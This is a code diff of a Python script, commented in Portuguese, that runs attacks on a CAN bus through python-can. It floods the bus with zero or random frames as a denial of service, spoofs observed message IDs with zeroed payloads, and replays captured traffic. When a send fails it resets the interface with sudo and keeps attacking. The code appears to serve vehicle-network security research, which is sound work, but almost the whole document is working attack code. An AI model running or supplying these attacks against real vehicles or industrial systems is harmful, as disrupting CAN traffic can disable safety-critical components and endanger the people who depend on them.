@@ -9,12 +9,20 @@ def zero_dos(): # Negação de serviço, o barramento ficará lotado com zeros, 
         message = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00], is_extended_id=False) # Mensagem CAN para inundar a rede zeros
 
         # Loop infinito para enviar continuamente mensagens CAN 
-        try: 
-            while True: 
-                bus.send(message) # Envio da mensagem
-                time.sleep(0.001) # Intervalo entre cada mensagem (em segundos) 
-        except KeyboardInterrupt:
-            pass
+        
+        while True:
+                try: 
+                        bus.send(message) # Envio da mensagem
+                        print(message)
+                        time.sleep(0.001) # Intervalo entre cada mensagem (em segundos) 
+                        
+                except Exception as e:
+                        print('erro', e)
+                        
+                        subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
+                        subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
+                        
+                        bus.flush_tx_buffer()   
 
         #bus.shutdown() # Limpeza da interface CAN
 
@@ -23,31 +31,37 @@ def message_spoofing_zero_payload():
 
         while True:
             try:
-                for message in bus:
-                    #print(message)
-                    if message.dlc == 1:
-                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00], is_extended_id=False)
-                        bus.send(message)
-                        time.sleep(0.01)
-                    elif message.dlc == 2:
-                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00], is_extended_id=False)
-                        bus.send(message)
-                        time.sleep(0.01)
-                    elif message.dlc == 3:
-                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00], is_extended_id=False)
-                        bus.send(message)
-                        time.sleep(0.01)
-                    elif message.dlc == 4:
-                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00, 0x00], is_extended_id=False)
-                        bus.send(message)
-                        time.sleep(0.01)
+                #for message in bus:
+                
+                message = bus.recv()
+                
+                if message.dlc == 1:
+                    message = can.Message(arbitration_id=message.arbitration_id, data=[0x00], is_extended_id=False)
+                    bus.send(message)
+                    time.sleep(0.01)
+                elif message.dlc == 2:
+                    message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00], is_extended_id=False)
+                    bus.send(message)
+                    time.sleep(0.01)
+                elif message.dlc == 3:
+                    message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00], is_extended_id=False)
+                    bus.send(message)
+                    time.sleep(0.01)
+                elif message.dlc == 4:
+                    message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00, 0x00], is_extended_id=False)
+                    bus.send(message)
+                    time.sleep(0.01)
+                
+                print(message)
+                
+                
             except Exception as e:
                 print('erro', e)
                 
                 subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                 subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                 
-                bus.flush_tx_buffer()        
+                bus.flush_tx_buffer()   
 
 # NÃO TERMINADO        
 def message_spoofing_min_payload(): # NÃO TERMINADO
@@ -75,7 +89,7 @@ def message_spoofing_min_payload(): # NÃO TERMINADO
         while True:
             try:
                 for message in bus:
-                    #print(message)
+                    print(message)
                     if message.dlc == 1:
                         message = can.Message(arbitration_id=message.arbitration_id, data=[0x00], is_extended_id=False)
                         bus.send(message)
@@ -104,8 +118,10 @@ def replay_messages():
     with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:
         while True:
             try:
-                for message in bus:
-                    bus.send(message)
+                message = bus.recv()
+                bus.send(message)
+                print(message)
+                time.sleep(0.001) # Intervalo entre cada mensagem (em segundos) 
        
             except Exception as e:
                 print('erro', e)
@@ -118,12 +134,38 @@ def replay_messages():
 def random_dos():
     with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:
 
-        message = can.Message(arbitration_id=hex(randint(1, 2074)), data=[hex(randint(1, 255)), hex(randint(1, 255)), hex(randint(1, 255)), hex(randint(1, 255))], is_extended_id=False) # Mensagem CAN para inundar a rede zeros
 
         # Loop infinito para enviar continuamente mensagens CAN 
-        try: 
-            while True: 
+        while True:
+            try:
+                        
+                rand_num = randint(1,4)
+                       
+                if rand_num == 1:
+                        message = can.Message(arbitration_id=randint(1, 2074), data=bytearray([randint(1, 255)]), is_extended_id=False)
+                elif rand_num == 2:
+                        message = can.Message(arbitration_id=randint(1, 2074), data=bytearray([randint(1, 255), randint(1, 255)]), is_extended_id=False)
+                elif rand_num == 3:
+                        message = can.Message(arbitration_id=randint(1, 2074), data=bytearray([randint(1, 255), randint(1, 255), randint(1, 255)]), is_extended_id=False)
+                elif rand_num == 4:
+                        message = can.Message(arbitration_id=randint(1, 2074), data=bytearray([randint(1, 255), randint(1, 255), randint(1, 255), randint(1, 255)]), is_extended_id=False) # Mensagem CAN para inundar a rede zeros    
+                
                 bus.send(message) # Envio da mensagem
+                        
+                print(message)
+                
                 time.sleep(0.001) # Intervalo entre cada mensagem (em segundos) 
-        except KeyboardInterrupt:
-            pass
+                        
+            except Exception as e:
+                print('erro', e)
+                        
+                subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
+                subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
+                        
+                bus.flush_tx_buffer()
+            
+
+#random_dos()
+#zero_dos()
+#message_spoofing_zero_payload()
+replay_messages()
